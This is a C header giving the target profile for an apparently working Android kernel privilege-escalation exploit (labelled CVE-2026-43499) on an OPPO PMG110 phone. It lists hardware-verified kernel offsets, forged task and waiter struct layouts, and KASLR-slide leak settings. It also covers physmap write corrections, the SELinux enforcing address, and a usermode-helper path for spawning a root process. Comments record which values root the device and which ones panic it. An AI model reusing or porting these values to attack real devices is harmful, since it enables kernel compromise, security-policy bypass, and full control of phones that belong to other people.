#ifndef OFFSET_H
#define OFFSET_H

/* OPPO PMG110 (K15 Pro+) — MediaTek MT6991, ColorOS 16
 *
 *   kernel 6.6.118-android15-8-g93e223c276e7-abogki500782043-4k (GKI, 4K pages)
 *   build  PMG110_16.0.9.400(CN01)
 *
 * The first non-Samsung, non-Qualcomm profile in this repository. Nothing in
 * the payload is Samsung-specific, and the app selects profiles on kernel
 * strings rather than on manufacturer, so the port is a matter of offsets.
 *
 * Struct offsets are shared with the pa3q (S25 Ultra) profile because both are
 * android15-6.6 GKI: FAKE_TASK_*, FAKE_WAITER_*, FOPS_*, and every workqueue
 * offset below were extracted independently from this kernel's BTF and came
 * out identical to pa3q's. That agreement is the cross-check for them.
 *
 * The kernel's A.19 (16.0.8.300) and A.20 (16.0.9.400) builds ship a
 * byte-identical Image, so this profile covers both.
 */

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "pmg110-16.0.9.400-app-physical-p0-oracle"
#define APP_PHYS_P0_ORACLE 1
#else
#define BUILD_VARIANT_LABEL "pmg110-16.0.9.400-root-umh"
#endif
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT "OPPO/PMG110/OP61E5L1:16/BP2A.250605.015/B.c24acd_188efc3_187038b:user/release-keys"
#endif

#define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
/* DRAM base, from the /memory node of the MT6991 DTB in vendor_boot. */
#define P0_PHYS_OFFSET 0x80000000ULL
/* MediaTek lk takes the kernel load address from the mblock allocator, which
 * the preloader seeds, so it is absent from boot.img and lk.img but present in
 * preloader_raw.img's memory-layout table as mb_kernel.start:
 *     mb_kernel  0x0080000000  size 0x07c80000
 * Note this equals P0_PHYS_OFFSET, i.e. delta 0 — see the caveat in the
 * profile NOTES before reusing the derivation on a device where it is not. */
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
#define SKB_DATA_DELTA (-0xe80LL)
#define SLIDE_FAKE_WAITER_PRIO 0
#define SLIDE_WAITER_WAKE_STATE 0
#define SLIDE_LOCK_OWNER_VALUE 1ULL
#define SLIDE_USE_FAKE_TASK 1
/* Return address of the single `bl schedule` inside worker_thread(), which is
 * where an idle kworker parks and therefore what get_wchan() reports in the
 * sched_blocked_reason `caller` field. worker_thread is at 0x000d978c and the
 * call is at 0x000d9824, so the caller is the next instruction. Confirmed on
 * hardware: the trace reports caller=worker_thread+0x9c. A wrong value here
 * cannot produce a wrong slide -- slide.c requires a 64KB-aligned candidate
 * within SLIDE_MAX_KASLR_OFFSET, so a mismatch fails the leak instead. */
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000d9828ULL
#define SLIDE_P0_OFFSET_CANDIDATES \
  0x150000ULL, 0x100000ULL, 0x130000ULL, 0x090000ULL, \
  0x1c0000ULL, 0x180000ULL, 0x050000ULL, 0x1a0000ULL, \
  0x160000ULL, 0x0e0000ULL, 0x1e0000ULL, 0x000000ULL, \
  0x010000ULL, 0x020000ULL, 0x030000ULL, 0x040000ULL, \
  0x060000ULL, 0x070000ULL, 0x080000ULL, 0x0a0000ULL, \
  0x0c0000ULL, 0x0d0000ULL, 0x0f0000ULL, 0x110000ULL, \
  0x120000ULL, 0x0b0000ULL, 0x170000ULL, 0x140000ULL, \
  0x190000ULL, 0x1b0000ULL, 0x1d0000ULL, 0x1f0000ULL
#define SLIDE_MAX_ATTEMPTS 32
/* This device does not use the Samsung placement model. Its kernel text is
 * randomised across the kernel VA region, while the physical load address is
 * fixed (P0_KERNEL_PHYS_LOAD == P0_PHYS_OFFSET, confirmed by a payload that
 * roots this device purely through the physmap alias). Measured on hardware:
 *
 *   caller       0xffffffdf9f0d9828   (worker_thread+0x9c, from tracefs)
 *   link_caller  0xffffffc0800d9828
 *   slide        0x1f1f000000         64KB aligned, ~124 GiB
 *
 * The default bound of 0x1f0000 rejected that even though the leak was right,
 * so raise it. 256GB is well inside the VA_BITS=39 kernel half and still
 * rejects a wildly wrong read. */
#define SLIDE_MAX_KASLR_OFFSET 0x4000000000ULL
/* Real arm64 KASLR here, not Samsung's 64KB placement step, so the slide is a
 * multiple of MIN_KIMG_ALIGN == 2MB. Every slide measured on this device is:
 * 1f1f000000, 280e200000, 260ca00000, 22bb800000, 2313600000. The tighter guard
 * is worth having because a wrong slide panics rather than fails -- it rejects
 * 0x132f0000, which is what `SLIDE_P0_OFFSET=0000002313600000` used to become
 * when the value was parsed as octal. */
#define SLIDE_KASLR_ALIGN 0x200000ULL

/* The physical placement offset, which is what the physmap aliases in fops.c
 * are corrected by -- deliberately separate from the KASLR slide above.
 *
 * Zero here, measured on the device with root rather than inferred:
 *   /proc/iomem  Kernel code starts at 0x80010000 = physical _stext
 *   kallsyms     _stext - _text = 0x10000, so physical _text = 0x80000000
 *   => P0_KERNEL_PHYS_LOAD == P0_PHYS_OFFSET == 0x80000000, delta 0
 * and init_task's linear-map address comes out at 0xffffff800213e780, which is
 * P0_DATA_ALIAS_CONST() with nothing added.
 *
 * Without this the payload adds 0x1f1f000000 to a physmap alias and writes
 * 124 GiB past its target. Two kernel panics on this device came from that. */
#define P0_PHYSICAL_OFFSET 0x0ULL
/* Measured on this kernel under QEMU (break on both syscall entries from one
 * task): core_sys_select frame 0x1f0 with stack_fds at sp+0x80,
 * futex_wait_requeue_pi frame 0x1c0 with rt_waiter at sp+0x90, entry-SP delta
 * -64, so the freed waiter lands on stack_fds word 0 and no logical fd-set
 * qwords precede it. slide_app.c would default this to 0 via #ifndef; it is
 * written out because a silently defaulted layout constant is exactly how the
 * other ports in this tree went wrong. */
#define SLIDE_PSELECT_WORD_SHIFT 0
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define ROUTE_WAIT_SECONDS 8
#define PSELECT_ENTER_DELAY_USEC 50000
#define SLIDE_PSELECT_TIMEOUT_NSEC 100000000L
#define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
#define SLIDE_KSNITCH_AVERAGE 8
#define SLIDE_BANK_SLOTS 4
#define SLIDE_BANK_TASK_OFF 0x1000
#define SLIDE_BANK_TASK_STRIDE 0x1c0
#define SLIDE_BANK_LOCK_OFF 0x5200
#define SLIDE_BANK_SLOT_STRIDE 0x100
#define SLIDE_BANK_WAITER_OFF 0x40
#define P0_ORACLE_GATE_SLOT 0
#define P0_ORACLE_PROBE_SLOT 1
#define P0_ORACLE_GATE_RESTORE_SLOT 2
#define P0_ORACLE_PROBE_RESTORE_SLOT 3
#define P0_ORACLE_GATE_PAGE_OFF 0x0e80
#define P0_ORACLE_GATE_OBJECT_INDEX 1
#define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
#define P0_FINGERPRINT_HEADER \
  "targets/pmg110-16.0.9.400/p0_fingerprint.h"
/* Measured here: the pipe page main.c seeds before prepare_good_kernel_page()
 * is back in the buddy allocator by the time install_pipe_physrw() scans it
 * (page_type 0xffffff7f == PageBuddy, page->lru holding vmemmap pointers), so
 * the scan matches nothing and PIPE_MAX_ATTEMPTS is 1 in the app build. Take a
 * fresh page at the point of use, which is what the non-app build's route
 * thread does and what its verified run relies on. Opt-in per target: the
 * Samsung app profiles ship against the seeded page and are not re-measured
 * here. */
#define PHYSRW_REFRESH_PIPE_PAGE 1
#endif
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

/* ashmem is the C driver on this build, not the Rust one. ASHMEM_MISC_FOPS is
 * the fops member of `struct miscdevice ashmem_misc` (ashmem_misc + 0x10),
 * verified in the image to hold &ashmem_fops. */
#define ASHMEM_MISC_FOPS_OFF 0x0229d268ULL
#define ASHMEM_FOPS_OFF 0x012fff00ULL
#define ASHMEM_IOCTL_OFF 0x00c9b0b0ULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x00c9b76cULL
#define ASHMEM_MMAP_OFF 0x00c9b7c0ULL
#define ASHMEM_OPEN_OFF 0x00c9b9e0ULL
#define ASHMEM_RELEASE_OFF 0x00c9ba68ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x00c9baf4ULL
/* The read side is the *plain* configfs_read_iter and the write side is the
 * *bin* one; that asymmetry is deliberate, because it is what the two halves of
 * the primitive are shaped for. configfs_read_once() sets buffer->page and
 * relies on buffer->count already holding the ashmem name prefix
 * (ASHMEM_PREFIX_COUNT), which is configfs_read_iter's contract;
 * configfs_write_once() sets bin_buffer/bin_buffer_size/cb_max_size, which is
 * configfs_bin_write_iter's. docs/PORTING.md names configfs_read_iter for this
 * define, and the Samsung profiles follow it.
 *
 * This carried 0x0049fc10 — configfs_bin_read_iter — until it was checked
 * against the image. Both tables are in there and settle it:
 *
 *   configfs_file_operations     @0x118a4c0  llseek=generic_file_llseek
 *                                            read_iter=0x0049f8ec
 *   configfs_bin_file_operations @0x118a5c8  llseek=NULL
 *                                            read_iter=0x0049fc10
 *
 * The bin variant cannot serve the read primitive twice over: it derefs
 * to_frag(file) == file->f_path.dentry->d_fsdata->s_frag unconditionally at
 * +0x3c, above mutex_lock, and /dev/ashmem* is a tmpfs dentry whose d_fsdata is
 * a small directory offset rather than a configfs_dirent; and even past that it
 * copies from bin_buffer/bin_buffer_size, which the read blob leaves zero, so it
 * would return 0 bytes. configfs_read_iter reaches the same to_frag chain only
 * inside the needs_read_fill branch, which the blob sets to 0 and skips.
 * See docs/PMG110-16.0.9.400.md. */
#define CONFIGFS_READ_ITER_OFF 0x0049f8ecULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x0049fe18ULL
/* Confirmed on hardware: with this value the payload reaches `cfi read ret=35`
 * and roots the device first attempt, where 0x0049fc10 panicked. The switch
 * below is kept because `pmg110-root` and `ghostlock-oneplus` root this device
 * with 0x0049fc10 and nothing explains how — see docs/PMG110-16.0.9.400.md:
 *     adb shell CONFIGFS_READ_ITER_OFF=0x0049fc10 LD_PRELOAD=... /system/bin/true
 * Gated per target so the Samsung profiles still build byte-identically. */
#define CONFIGFS_READ_ITER_ENV_OVERRIDE 1
#define COPY_SPLICE_READ_OFF 0x004235e0ULL
#define NOOP_LLSEEK_OFF 0x003d6340ULL
#define INIT_TASK_OFF 0x0213e780ULL
#define ROOT_TASK_GROUP_OFF 0x02338580ULL
/* 6.6 has no `selinux_enforcing` symbol; this is selinux_state + 0, whose
 * first member is .enforcing under CONFIG_SECURITY_SELINUX_DEVELOP=y. */
#define SELINUX_ENFORCING_OFF 0x0237b220ULL
#define KMALLOC_CACHES_OFF 0x0168de30ULL
#define ANON_PIPE_BUF_OPS_OFF 0x0117f188ULL

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d0f00ULL
#define SYSTEM_UNBOUND_WQ_OFF 0x0212b320ULL
#define CALL_USERMODEHELPER_EXEC_WORK \
  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

/* nfulnl_logger.name, i.e. the "nfnetlink_log" string the logger points at. */
#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x016222d0ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x02132750ULL
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
/* random_table + 0x108 — the ctl_table .data slot holding &sysctl_bootid. */
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x0225a168ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x0239c218ULL

#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

#define LOCK_OFF 0x2210
#define W0_OFF 0x2350
#define FOPS_OFF 0x2000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

#define FAKE_WAITER_TREE_PRIO_OFF 0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF 0x50
#define FAKE_WAITER_LOCK_OFF 0x58
#define FAKE_WAITER_WAKE_STATE_OFF 0x60
#define FAKE_WAITER_WW_CTX_OFF 0x68

/* Re-confirmed by disassembly, not only by BTF: remove_waiter at 0x01077ff4
 * does `add x21, x20, #0x90c` for pi_lock and `str xzr, [x20, #0x938]` for
 * pi_blocked_on, with x20 = current. That routine using `current` rather than
 * waiter->task is also what makes this kernel vulnerable — the stable fix
 * first shipped in 6.6.140 and this is 6.6.118. */
#define FAKE_TASK_USAGE_OFF 0x40
#define FAKE_TASK_PRIO_OFF 0x84
#define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
#define FAKE_TASK_TASK_GROUP_OFF 0x348
#define FAKE_TASK_PI_LOCK_OFF 0x90c
#define FAKE_TASK_PI_WAITERS_OFF 0x920
#define FAKE_TASK_PI_TOP_TASK_OFF 0x930
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x938

#define CFG_PAGE_OFF 16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF 88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF 100

#define WQ_DFL_PWQ_OFF 0xb0
#define PWQ_POOL_OFF 0x00
#define PWQ_WQ_OFF 0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF 0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF 0x5c
#define PWQ_MAX_ACTIVE_OFF 0x60
#define POOL_WORKLIST_OFF 0x28
#define POOL_NR_IDLE_OFF 0x3c

#define WORK_DATA_OFF 0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF 0x18

#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x08
#define STRUCT_PAGE_TYPE_OFF 0x30

#define PIPE_BUFFER_SLOTS 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x48
#define FOPS_COMPAT_IOCTL_OFF 0x50
#define FOPS_MMAP_OFF 0x58
#define FOPS_OPEN_OFF 0x68
#define FOPS_RELEASE_OFF 0x78
#define FOPS_SPLICE_READ_OFF 0xb8
#define FOPS_SHOW_FDINFO_OFF 0xd8

#endif
